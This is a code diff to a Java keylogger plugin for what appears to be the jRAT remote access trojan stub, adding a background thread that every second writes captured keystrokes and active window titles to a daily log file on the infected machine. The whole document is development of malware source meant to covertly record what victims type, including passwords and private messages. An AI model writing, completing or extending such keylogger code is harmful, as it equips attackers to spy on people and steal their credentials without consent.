@@ -1,10 +1,14 @@
 package pro.jrat.plugin.stub;
 
 import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.PrintWriter;
 
 import org.jnativehook.GlobalScreen;
 
@@ -121,7 +125,6 @@ public class KeyloggerPlugin extends StubPlugin {
 		}
 
 		Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
-
 			@Override
 			public void run() {
 				try {
@@ -130,8 +133,32 @@ public class KeyloggerPlugin extends StubPlugin {
 					ex.printStackTrace();
 				}
 			}
-
 		}));
+		
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				while (true) {
+					try {
+						Thread.sleep(1000L);
+						
+						PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(Keylogger.getTodaysFile(), true)));
+						
+						for (Activity a : Activities.activities) {
+							if (a instanceof Title) {
+								out.println("\n\r" + a.toString() + "\n\r\n\r");
+							} else {
+								out.println(((Key)a).getChar());
+							}
+						}
+						
+						out.close();
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+				}
+			}	
+		}).start();
 	}
 	
 	public static File getLogsRoot() {
